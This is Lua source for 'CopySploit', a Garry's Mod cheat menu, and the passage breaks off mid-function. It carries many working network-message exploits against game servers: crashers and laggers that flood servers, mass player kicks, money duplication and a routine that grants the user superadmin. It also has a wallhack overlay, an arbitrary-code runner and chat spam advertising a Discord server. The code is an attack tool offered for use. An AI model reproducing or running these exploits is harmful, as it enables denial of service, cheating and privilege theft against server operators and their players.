local C = table.Copy( concommand )
local CCA = C.Add
local prant = print
prant( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
MsgC (Color( 66, 61, 55 ), [[

   _____                   _____       _       _ _   
  / ____|                 / ____|     | |     (_) |  
 | |     ___  _ __  _   _| (___  _ __ | | ___  _| |_ 
 | |    / _ \| '_ \| | | |\___ \| '_ \| |/ _ \| | __|
 | |___| (_) | |_) | |_| |____) | |_) | | (_) | | |_ 
  \_____\___/| .__/ \__, |_____/| .__/|_|\___/|_|\__|
             | |     __/ |      | |                  
             |_|    |___/       |_|                  
]])
surface.PlaySound("garrysmod/content_downloaded.wav")
------------------------------------------------------------------------CopySploit MENU--------------------------------------------------------------------------------------
--[[ WATERMARK ]] --
--[[Watermark = vgui.Create( "HTML" )
Watermark:SetPos( -13, -8)
Watermark:SetSize( ScrW(), ScrH())
Watermark:OpenURL( "" )]]
----------------------------------------------
Version = "+"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--[[BigExploits["Мани с дуэли)"] = {func =
function()
    if pMenu.IsNetString("duelrequestguiYes") then
        net.Start("duelrequestguiYes")
        net.WriteInt(-2147483648,32)--b1g 32 bit int laff -> -99999999999999999999999999999999999999999999999999999999999999999999999999999
        net.WriteEntity(table.Random( player.GetAll() ) )
        net.WriteString("Crossbow")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики стилят оружия?"] = {func =
function()
    if pMenu.IsNetString("drugseffect_remove") then
        net.Start("drugseffect_remove")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики крадут деньги?"] = {func =
function()
    if pMenu.IsNetString("drugs_money") then
        net.Start("drugs_money")
        net.SendToServer()
    end
end
}
BigExploits["Наркотики поджигают все пропы?"] = {func =
function()
    if pMenu.IsNetString("drugs_ignite") then
        net.Start("drugs_ignite")
        net.WriteString("prop_physics")
        net.SendToServer()
    end
end
}
BigExploits["Наркота убирает все пропы?"] = {func =
function()
    if pMenu.IsNetString("drugs_text") then
        net.Start("drugs_text")
        net.WriteString("prop_physics")
        net.SendToServer()
    end
end
}
BigExploits["TGN Advanced Money Printer Взят кэш)"] = {func =
function()
    if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
        for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
            if v:IsValid() then
                net.Start( "SyncPrinterButtons76561198056171650" )
                net.WriteEntity(v)
                net.WriteUInt(2, 4)
                net.SendToServer()
            end
        end
    end
end
}

BigExploits["Логгирующий скрипт кикает всех?"] = {func =
function()
    if pMenu.IsNetString("DL_Answering") then
        local function reportQuestionmark()
            for i = 1, 2000 do
                net.Start("DL_Answering")
                net.SendToServer()
            end
        end
        timer.Create(pMenu.RandomString(20),0.1,50,reportQuestionmark)
    end
end
}
BigExploits["SimplicityAC Краш сервера"] = {func =
function()
    if pMenu.IsNetString("SimplicityAC_aysent") then
        local tbl = {}
        for i=1,1000 do
            tbl[i] = i;
        end
        net.Start("SimplicityAC_aysent")

        net.WriteUInt(1, 8)

        net.WriteUInt(4294967295, 32)

        net.WriteTable(tbl)

        net.SendToServer()
    end
end
}
BigExploits["Auzlex's Teleport System Lag"] = {func =
function()
    if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
        timer.Create(pMenu.RandomString(20),0.05,6000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start( "ATS_WARP_REMOVE_CLIENT" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
                net.Start( "ATS_WARP_FROM_CLIENT" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
                net.Start( "ATS_WARP_VIEWOWNER" )
                net.WriteEntity( v )
                net.WriteString( "adminroom1" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 2"] = {func =
function()
    if pMenu.IsNetString("CFRemoveGame") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start( "CFRemoveGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                net.Start( "CFJoinGame" )
                net.WriteFloat( math.Round( "10000\n" ) )
                net.SendToServer()
                net.Start( "CFEndGame" )
                net.WriteFloat( "10000\n" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 3"] = {func =
function()
    if pMenu.IsNetString("CreateCase") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 300 do
                net.Start( "CreateCase" )
                net.WriteString( "tapped by b1g hack from citizenhack.me" )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 4"] = {func =
function()
    if pMenu.IsNetString("rprotect_terminal_settings") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 200 do
                net.Start( "rprotect_terminal_settings" )
                net.WriteEntity( LocalPlayer() )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 5"] = {func =
function()
    if pMenu.IsNetString("StackGhost") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 8 do
                for k,v in pairs( player.GetAll() ) do
                    net.Start( "StackGhost" )
                    net.WriteInt(69,32)
                    net.SendToServer()
                end
            end
        end)
    end
end
}
BigExploits["Lagger 6"] = {func =
function()
    if pMenu.IsNetString("JoinOrg") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for k,v in pairs(player.GetAll()) do
                net.Start("JoinOrg")
                    net.WriteEntity(LocalPlayer())
                    net.WriteString("test")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 7"] = {func =
function()
    if pMenu.IsNetString("pac_submit") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 1800 do
                net.Start("pac_submit")
                net.SendToServer()
            end
        end)
    end
end
}

BigExploits["Lagger 8"] = {func =
function()
    if pMenu.IsNetString("steamid2") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i = 1, 300 do
                net.Start( "steamid2" )
                net.WriteString( "S P I C Y " )
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 9"] = {func =
function()
    if pMenu.IsNetString("NDES_SelectedEmblem") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 2000 do
                net.Start("NDES_SelectedEmblem")
                net.WriteString("exploitcity has to be a joke they can be for real.")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Lagger 10"] = {func =
function()
    if pMenu.IsNetString("join_disconnect") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 3000 do
                net.Start("join_disconnect")
                net.WriteEntity(table.Random(player.GetAll()))
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["PAC Crash Server old"] = {func =
function()
    if pMenu.IsNetString("pac_to_contraption") then
        local tbl = {}

        for i=1,1000000000 do

            tbl[#tbl + 1] = i

        end

        net.Start("pac_to_contraption")

        net.WriteTable( tbl )

        net.SendToServer()
    end
end
}
BigExploits["NLRKick"] = {func =
function()
    if pMenu.IsNetString("NLRKick") then
        for k,v in pairs(player.GetAll()) do
            if v == LocalPlayer() then
                continue;
            end
            net.Start("NLRKick")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
end
}
BigExploits["B1g Crasher"] = {func =
function()
    if pMenu.IsNetString("Morpheus.StaffTracker") then
        timer.Create(pMenu.RandomString(20),0.02,15000,function()
            for i=1, 2000 do
                net.Start("Morpheus.StaffTracker")
                net.SendToServer()
            end
        end)
    end
end
}
BigExploits["Give superadmin"] = {func =
function()
    if pMenu.IsNetString("pplay_deleterow") then
        local id = LocalPlayer():SteamID()
        local tbl = {}
        tbl.name = "FAdmin_PlayerGroup"
        tbl.where = {"steamid",tostring(id)}

        net.Start("pplay_deleterow")

        net.WriteTable(tbl)

        net.SendToServer()



        local tbl = {}

        tbl.tblname = "FAdmin_PlayerGroup"

        tbl.tblinfo = {tostring(id),"superadmin"}

        net.Start("pplay_addrow")

        net.WriteTable(tbl)
        net.SendToServer()
    end
end
}
BigExploits["pm spam"] = {func =
function()
    timer.Create(pMenu.RandomString(20),5,10,function()
        for k,v in pairs(player.GetAll()) do
            if v == LocalPlayer() then
                continue;
            end
            LocalPlayer():ConCommand("ulx psay "..v:Nick().." SERVER OWNED discord.gg/weJb7TJ "..LocalPlayer():Nick())
        end
    end)
end
}
BigExploits["asay spam"] = {func =
function()
    timer.Create(pMenu.RandomString(20),1.1,10,function()
        for i=1, ((1/FrameTime())) do
            LocalPlayer():ConCommand("ulx asay"..'"discord.gg/weJb7TJ')
        end
    end)
end
}
]]--
/*

 CreateClientConVar( "gravko_esp", "0", true, true)
local function gravesp2()
if tobool( GetConVarNumber( "gravko_esp" ) ) then
for k, v in pairs( player.GetAll() ) do
local pos = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
draw.SimpleTextOutlined( v:Nick(), "Default", pos.x + 40, pos.y + 15, Color(0,255,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
local hp = "HP: "..v:Health()
local teamcol = team.GetColor(v:Team())
local wep2 = v:GetActiveWeapon()
local rank1 = "["..v:GetUserGroup().."]"
local friend = v:GetFriendStatus()
local targetDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
local targetDistance3 = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/100000)

//draw.SimpleTextOutlined( targetDistance, "Default", pos.x + 40, pos.y + 30, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )

draw.SimpleTextOutlined( hp, "Default", pos.x + 40, pos.y + 27, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )


draw.SimpleTextOutlined( rank1, "Default", pos.x + 40, pos.y + 5, Color(255,0,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )

//draw.SimpleTextOutlined( friend, "Default", pos.x + 40, pos.y + 20, Color(0,150,255), 1, 1, 1, Color( 0, 0, 0, 255 ) )

local boxpos2 = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
draw.RoundedBox(5, pos.x - 6, pos.y + targetDistance3, 11, 11, Color(teamcol.r,teamcol.g,teamcol.b, 255), 1)
end
end
end
hook.Add( "HUDPaint", "esp2", gravesp2)
-------------------------------------------------------- */
showunk = CreateClientConVar("gmhax_ShowUnknownEntity", "1", true, true)

shouldloot = CreateClientConVar("gmhax_showdarkrploot2", "0", true, true)
hook.Add("HUDPaint", "findtherpshit", function()
        if shouldloot:GetBool() then
        for k, v in pairs(ents.GetAll()) do
        local mDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
        Pos = v:GetPos():ToScreen()
        if not string.find(v:GetClass(), "prop") and not string.find(v:GetClass(), "func") and not string.find(v:GetClass(), "class") and not string.find(v:GetClass(), "env") and not string.find(v:GetClass(), "player") and not string.find(v:GetClass(), "view") and not string.find(v:GetClass(), "world") and not string.find(v:GetClass(), "weapon_") and not string.find(v:GetClass(), "gmod") and not string.find(v:GetClass(), "beam") and not string.find(v:GetClass(), "manipulate") and not string.find(v:GetClass(), "sent") and not string.find(v:GetClass(), "m9k") and not string.find(v:GetClass(), "gun") and not string.find(v:GetClass(), "pocket") and not string.find(v:GetClass(), "vending") and not string.find(v:GetClass(), "npc") and not string.find(v:GetClass(), "sammy") and not string.find(v:GetClass(), "stunstick") and not string.find(v:GetClass(), "unarrest_stick") and not string.find(v:GetClass(), "arrest_stick") and not string.find(v:GetClass(), "door") and not string.find(v:GetClass(), "keys") and not string.find(v:GetClass(), "keypad") and not string.find(v:GetClass(), "lock") and not string.find(v:GetClass(), "chat") and not string.find(v:GetClass(), "gmt") and not string.find(v:GetClass(), "weaponchecker") and not string.find(v:GetClass(), "Keypad") and not string.find(v:GetClass(), "med_") and not string.find(v:GetClass(), "darkrp") and not string.find(v:GetClass(), "swep") and not string.find(v:GetClass(), "fas2") and not string.find(v:GetClass(), "ent_spike") and not string.find(v:GetClass(), "car") and not string.find(v:GetClass(), "fuel") and not string.find(v:GetClass(), "taser") and not string.find(v:GetClass(), "point") and not string.find(v:GetClass(), "hook") and not string.find(v:GetClass(), "tv") and not string.find(v:GetClass(), "newspaper") and not string.find(v:GetClass(), "atm") and not string.find(v:GetClass(), "handcuffs") and not string.find(v:GetClass(), "payphone") and not string.find(v:GetClass(), "wire") then
                                if string.find(v:GetClass(), "printer") then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Принтер", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 54, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif v:GetClass() == "spawned_shipment" then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
                                         draw.SimpleTextOutlined("Ящики", "Default", Pos.x + 30, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 55, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif string.find(v:GetClass(), "durgz") then
                                     -- draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                         draw.SimpleTextOutlined("Наркота", "Default", Pos.x + 23, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif v:GetClass() == "spawned_weapon" then
                                        //draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Оружие", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))

                                        elseif v:GetClass() == "spawned_money" then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Деньги", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        else
                                        if showunk:GetBool() then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        --//draw.SimpleTextOutlined("Неизвестное энтити", "Default", Pos.x + 47, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 53, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        end

                                end
                        end
                end
        end
end)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ulxflood = false
local netKey = ""
local CopySploit = nil
if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
function playSound(url)

    sound.PlayURL(url, '', function( station )

        if ( IsValid( station ) ) then

        station:SetPos( LocalPlayer():GetPos() )
        station:Play()

        end
    end)

end
playSound("")

function anticheats()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.Menu:Remove()
RunConsoleCommand( "CopySploit_anticheats")
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------
		function editor()
		local PANEL = {}

	PANEL.URL = "http://metastruct.github.io/lua_editor/"
	PANEL.COMPILE = "C"

	local javascript_escape_replacements =
	{
		["\\"] = "\\\\",
		["\0"] = "\\0" ,
		["\b"] = "\\b" ,
		["\t"] = "\\t" ,
		["\n"] = "\\n" ,
		["\v"] = "\\v" ,
		["\f"] = "\\f" ,
		["\r"] = "\\r" ,
		["\""] = "\\\"",
		["\'"] = "\\\'",
	}

	function PANEL:Init()
		self.Code = ""

		self.ErrorPanel = self:Add("DButton")
		self.ErrorPanel:SetFont('BudgetLabel')
		self.ErrorPanel:SetTextColor(Color(255,255,255))
		self.ErrorPanel:SetText("")
		self.ErrorPanel:SetTall(0)
		self.ErrorPanel.DoClick = function()
			self:GotoErrorLine()
		end
		self.ErrorPanel.DoRightClick = function(self)
			SetClipboardText(self:GetText())
		end
		self.ErrorPanel.Paint = function(self,w,h)
			surface.SetDrawColor(255,50,50)
			surface.DrawRect(0,0,w,h)
		end

		self:StartHTML()
	end

	function PANEL:Think()
		if self.NextValidate && self.NextValidate < CurTime() then
			self:ValidateCode()
		end
	end

	function PANEL:StartHTML()
		self.HTML = self:Add("DHTML")

		self:AddJavascriptCallback("OnCode")
		self:AddJavascriptCallback("OnLog")

		self.HTML:OpenURL(self.URL)

		self.HTML:RequestFocus()
	end

	function PANEL:ReloadHTML()
		self.HTML:OpenURL(self.URL)
	end

	function PANEL:JavascriptSafe(str)
		str = str:gsub(".",javascript_escape_replacements)
		str = str:gsub("\226\128\168","\\\226\128\168")
		str = str:gsub("\226\128\169","\\\226\128\169")
		return str
	end

	function PANEL:CallJS(JS)
		self.HTML:Call(JS)
	end

	function PANEL:AddJavascriptCallback(name)
		local func = self[name]

		self.HTML:AddFunction("gmodinterface",name,function(...)
			func(self,HTML,...)
		end)
	end

	function PANEL:OnCode(_,code)
		self.NextValidate = CurTime() + 0.2
		self.Code = code
	end

	function PANEL:OnLog(_,...)
		Msg("Editor: ")
		print(...)
	end

	function PANEL:SetCode(code)
		self.Code = code
		self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
	end

	function PANEL:GetCode()
		return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
	end

	function PANEL:SetGutterError(errline,errstr)
		self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
	end

	function PANEL:GotoLine(num)
		self:CallJS("GotoLine('" .. num .. "')")
	end

	function PANEL:ClearGutter()
		self:CallJS("ClearErr()")
	end

	function PANEL:GotoErrorLine()
		self:GotoLine(self.ErrorLine || 1)
	end

	function PANEL:SetError(err)
		if !IsValid(self.HTML) then
			self.ErrorPanel:SetText("")
			self:ClearGutter()
			return
		end

		local tall = 0

		if err then
			local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

			if line && err then
				tall = 20

				self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
				self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
				self:SetGutterError(self.ErrorLine,err)
			end
		else
			self.ErrorPanel:SetText("")
			self:ClearGutter()
		end

		local wide = self:GetWide()
		local tallm = self:GetTall()

		self.ErrorPanel:SetPos(0,tallm - tall)
		self.ErrorPanel:SetSize(wide,tall)
		self.HTML:SetSize(wide,tallm - tall)
	end

	function PANEL:ValidateCode()
		local time = SysTime()
		local code = self:GetCode()

		self.NextValidate = nil

		if !code || code == "" then
			self:SetError()
			return
		end

		local errormsg = CompileString(code,self.COMPILE,false)
		time = SysTime() - time

		if type(errormsg) == "string" then
			self:SetError(errormsg)
		elseif time > 0.25 then
			self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
		else
			self:SetError()
		end
	end

	function PANEL:PerformLayout(w,h)
		local tall = self.ErrorPanel:GetTall()

		self.ErrorPanel:SetPos(0,h - tall)
		self.ErrorPanel:SetSize(w,tall)

		self.HTML:SetSize(w,h - tall)
	end


	vgui.Register("lua_editor",PANEL,"EditablePanel")

	local menu = vgui.Create('DFrame')
	menu:SetSize(ScrW()/2,ScrH()/2)
	menu:SetTitle('                                                                                                                                   Lua Code | Run On Self')
	menu:Center()
	menu:SetSizable(true)
	menu:MakePopup()
	menu:ShowCloseButton(false)
	menu.Paint = function(self,w,h)
		surface.SetDrawColor(30,30,30)
		surface.DrawRect(0, 0, w, 25)

		surface.SetDrawColor(0,0,0)
		surface.DrawRect(0, 25, w, h-25)
	end

	local clos = vgui.Create("DButton", menu)
	clos:SetSize(40,23)
	clos:SetText("")
	clos.Paint = function(self,w,h)
		surface.SetDrawColor(196,80,80)
		surface.DrawRect(0,0,w,h)
		surface.SetFont("marlett")
		local s,s1 = surface.GetTextSize("r")
		surface.SetTextPos(w/2-s/2,h/2-s1/2)
		surface.SetTextColor(255,255,255)
		surface.DrawText("r")
	end
	clos.DoClick = function()
		menu:SetVisible(!menu:IsVisible())
	end

	local ed = vgui.Create('lua_editor', menu)
	ed:SetPos(5, 55)

	menu.PerformLayout = function(self, w, h)
		clos:SetPos(w-41, 1)
		ed:SetSize(w-10, h-60)
	end

	local offset = 5

	local function CreateBtn(wide, text, icon, fn)
		local mt = Material(icon)
		local btn = vgui.Create('DButton', menu)
		btn:SetText('')
		btn.Paint = function(self,w,h)
			if self.Hovered then
				if self.Depressed then
					surface.SetDrawColor(90,90,90)
				else
					surface.SetDrawColor(70,70,70)
				end
			else
				surface.SetDrawColor(40,40,40)
			end

			surface.DrawRect(0,0,w,h)
			surface.SetDrawColor(255,255,255)
			surface.SetMaterial(mt)
			surface.DrawTexturedRect(5,h / 2 - 8,16,16)
			draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
		end
		btn.DoClick = fn
		btn:SetSize(wide, 20)
		btn:SetPos(offset, 30)
		offset=offset + wide + 5
	end

	-- CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
	-- 	local code = ed:GetCode()
	-- 	net.Start('_da_')
	-- 	net.WriteString(code)
	-- 	net.WriteUInt(1, 2)
	-- 	net.SendToServer()
	-- end)
	CreateBtn(115, "Run on self", 'icon16/arrow_down.png', function()
		local code = ed:GetCode()
		RunString(code)
	end)
	-- CreateBtn(130, "Run on clients", 'icon16/group.png', function()
	-- 	local code = ed:GetCode()
	-- 	net.Start('_da_')
	-- 	net.WriteString(code)
	-- 	net.WriteUInt(2, 2)
	-- 	net.SendToServer()
	-- end)
	-- CreateBtn(125, "Run on player", 'icon16/user.png', function()
	-- 	local code = ed:GetCode()
	-- 	local m = DermaMenu()
	-- 	for k, v in pairs(player.GetAll()) do
	-- 		m:AddOption(v:Name(), function()
	-- 			net.Start('_da_')
	-- 			net.WriteString(code)
	-- 			net.WriteUInt(3, 2)
	-- 			net.WriteEntity(v)
	-- 			net.SendToServer()
	-- 		end)
	-- 	end
	-- 	m:Open()
	-- end)

	-- CreateBtn(115, "Get player", 'icon16/pencil.png', function()
	-- 	local m = DermaMenu()
	-- 	for k, v in pairs(player.GetAll()) do
	-- 		m:AddOption(v:Name(), function()
	-- 			SetClipboardText('Entity('..v:EntIndex()..')')
	-- 		end)
	-- 	end
	-- 	m:Open()
	-- end)

	concommand.Add('editor', function() menu:SetVisible(!menu:IsVisible()) end)

	iZNX.Menu:Remove()

	MsgC(Color(255, 155, 55), "Loading end!\n")
	end
------------------------------------------------------------------------------------------------------------------------------------------------------------
function gui.url()
surface.PlaySound("garrysmod/ui_click.wav")
gui.OpenURL( "http://discord.gg/weJb7TJ" )
end
function iZNX.ChatText( str )
ctext( Color(190, 190, 190), [[ [CopySploit]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if CopySploit and CopySploit.G and CopySploit.G.net then
netstart = CopySploit.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if CopySploit and CopySploit.G and CopySploit.G.net then
netstart = CopySploit.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = { -- Цвет обводки эксплойтов (их "значимость")
[1337] = Color( 255, 0, 0 ),
[1] = Color( 33, 33, 33 ),
[2] = Color( 33, 33, 33 ),
[3] = Color( 33, 33, 33 ),
[4] = Color( 33, 33, 33 ),
}
function iZNX.AddExploit( name, tab ) -- ОДЭДЭ ЭКСПЛОЙТ, FUCK
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
spoofchat = 0
-----------------------------------------------------------------------------  EXPLOITS  -------------------------------------------------------------------------------------------------------------------------------------------

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   NEW SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]]

iZNX.AddExploit( "[NEW] Crasher", {
desc = "Exploit",
severity = 1337,
scan = function() return iZNX.ValidNetString( "pac.net.TouchFlexes.ClientNotify" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "crashlol" ) then
timer.Create("crashlol", 0, 0, function()
for i = 1, 400 do
iZNX.NetStart("pac.net.TouchFlexes.ClientNotify")
net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
iZNX.ChatText("Начинаем краш")
else
timer.Remove("crashlol")
iZNX.ChatText("Прекращаем краш")
end
end }
}
}
)
iZNX.AddExploit( "[NEW] € Easy Money €", {
desc = "Exploit на деньги",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ply_pick_shit" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем деньги")
for k, v in pairs (player.GetAll()) do
for i = 1,255 do
iZNX.NetStart("ply_pick_shit")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.SendToServer()
end
end
end }
}
}
)
iZNX.AddExploit( "[NEW] Spoof Chat Icon", {
desc = "Не серьезный эксплойт, просто фановый. Убирает иконку набирания текста",
severity = 1337,
scan = function() return iZNX.ValidNetString( "TalkIconChat" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if spoofchat == 0 then
hook.Remove('StartChat', 'TalkIcon')
iZNX.NetStart("TalkIconChat")
net.WriteBool(true)
net.SendToServer()
spoofchat = 1
iZNX.ChatText("Icon Spoofer включен")
else
iZNX.NetStart("TalkIconChat")
net.WriteBool(false)
net.SendToServer()
iZNX.ChatText("Icon Spoofer выключен")
spoofchat = 0
end
end }
}
}
)
iZNX.AddExploit( "[NEW] TFA Lag Exploit", {
desc = "Exploit для создания лагов на сервере, с паком оружия TFA",
severity = 1337,
scan = function() return iZNX.ValidNetString( "TFA_Attachment_RequestAll" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if !timer.Exists( "tfalags" ) then
timer.Create("tfalags", 0, 0, function()
for i = 1, 400 do
